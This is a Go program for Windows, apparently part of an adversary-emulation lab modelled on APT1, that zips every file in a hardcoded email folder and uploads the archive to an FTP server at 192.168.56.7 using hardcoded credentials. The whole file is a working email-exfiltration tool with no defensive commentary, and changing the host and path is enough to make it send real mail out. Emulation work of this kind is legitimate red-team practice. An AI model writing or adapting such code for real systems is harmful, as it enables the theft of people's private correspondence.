//go:build windows
// +build windows

package main

import (
	"archive/zip"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"

	"github.com/jlaffaye/ftp"
)

// Hardcoded configuration
const (
	emailDir = "C:\\artifact\\APT1\\emails"
	ftpHost  = "192.168.56.7"
	ftpUser  = "vagrant"
	ftpPass  = "vagrant"
	ftpDir   = "."
)

func main() {
	execute := flag.Bool("extract", false, "Extract emails")

	flag.Parse()

	if *execute {
		fmt.Println("Extracting")
		email()
	} else {
		fmt.Println("Use --extract flag to run the extraction process")
		flag.PrintDefaults()
	}
}

func email() {
	// Create a temporary zip file
	zipFile, err := ioutil.TempFile("", "emails-*.zip")
	if err != nil {
		fmt.Println("Error creating temporary file:", err)
		return
	}
	defer os.Remove(zipFile.Name())

	// Create a new zip archive
	zipWriter := zip.NewWriter(zipFile)

	// Walk through the email directory
	err = filepath.Walk(emailDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			// Add file to zip
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()

			zipEntry, err := zipWriter.Create(filepath.Base(path))
			if err != nil {
				return err
			}

			_, err = io.Copy(zipEntry, file)
			if err != nil {
				return err
			}
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error walking through directory:", err)
		return
	}

	// Close the zip writer
	zipWriter.Close()

	// Connect to FTP server
	ftpConn, err := ftp.Dial(ftpHost, ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		fmt.Println("Error connecting to FTP server:", err)
		return
	}
	defer ftpConn.Quit()

	// Login to FTP server
	err = ftpConn.Login(ftpUser, ftpPass)
	if err != nil {
		fmt.Println("Error logging into FTP server:", err)
		return
	}

	// Change to the specified directory
	err = ftpConn.ChangeDir(ftpDir)
	if err != nil {
		fmt.Println("Error changing FTP directory:", err)
		return
	}

	// Open the zip file for reading
	zipFile, err = os.Open(zipFile.Name())
	if err != nil {
		fmt.Println("Error opening zip file for upload:", err)
		return
	}
	defer zipFile.Close()

	// Upload the file
	err = ftpConn.Stor(fmt.Sprintf("emails_%s.zip", time.Now().Format("20060102_150405")), zipFile)
	if err != nil {
		fmt.Println("Error uploading file to FTP server:", err)
		return
	}

	fmt.Println("Emails have been successfully zipped and uploaded to the FTP server")
}
